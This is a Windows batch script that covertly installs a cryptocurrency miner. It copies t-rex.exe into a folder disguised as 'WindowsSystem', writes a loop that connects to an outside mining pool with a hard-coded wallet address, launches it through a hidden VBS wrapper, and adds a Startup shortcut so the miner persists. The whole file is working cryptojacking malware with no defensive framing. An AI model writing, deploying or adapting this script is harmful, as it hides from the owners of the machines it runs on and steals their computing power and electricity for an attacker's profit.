@echo off
setlocal

:: Define paths
set "INSTALL_DIR=%APPDATA%\WindowsSystem"
set "MINER_SCRIPT=%INSTALL_DIR%\miner.bat"
set "VBS_SCRIPT=%INSTALL_DIR%\run_hidden.vbs"
set "STARTUP_SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\miner.lnk"
set "MINER_EXE=t-rex.exe"
set "MINER_PATH=%CD%\%MINER_EXE%" 

:: Create hidden directory
mkdir "%INSTALL_DIR%" 2>nul

:: Copy miner executable and script to hidden directory
copy "%MINER_PATH%" "%INSTALL_DIR%\%MINER_EXE%" /Y >nul 2>&1

:: Write miner script
echo @echo off > "%MINER_SCRIPT%"
echo :loop >> "%MINER_SCRIPT%"
echo ping -n 1 1.1.1.1 ^>nul || (timeout /t 5 >nul & goto loop) >> "%MINER_SCRIPT%"
echo start /b "%INSTALL_DIR%\%MINER_EXE%" -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe >> "%MINER_SCRIPT%"

:: Write VBS script to run miner hidden
echo Set WshShell = CreateObject("WScript.Shell") > "%VBS_SCRIPT%"
echo WshShell.Run """%MINER_SCRIPT%""", 0, False >> "%VBS_SCRIPT%"

:: Create a shortcut in the Startup folder
powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_SHORTCUT%'); $s.TargetPath='wscript.exe'; $s.Arguments='""%VBS_SCRIPT%""'; $s.Save()"

:: Run miner immediately
wscript "%VBS_SCRIPT%"

exit
